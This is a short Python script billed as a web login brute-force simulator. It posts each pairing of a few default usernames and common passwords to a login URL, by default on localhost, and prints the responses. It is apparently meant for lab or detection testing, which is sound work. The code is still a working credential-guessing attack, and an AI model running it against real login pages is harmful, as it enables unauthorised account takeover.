from __future__ import annotations

import argparse
from itertools import product

import requests


def main() -> None:
    parser = argparse.ArgumentParser(description="Simple web login brute force simulator")
    parser.add_argument("--url", default="http://localhost:5000/login")
    parser.add_argument("--usernames", nargs="+", default=["admin", "demo", "soc"])
    parser.add_argument("--passwords", nargs="+", default=["password", "123456", "admin123"])
    args = parser.parse_args()

    for username, password in product(args.usernames, args.passwords):
        response = requests.post(args.url, data={"username": username, "password": password}, timeout=5)
        print(username, password, response.status_code)


if __name__ == "__main__":
    main()
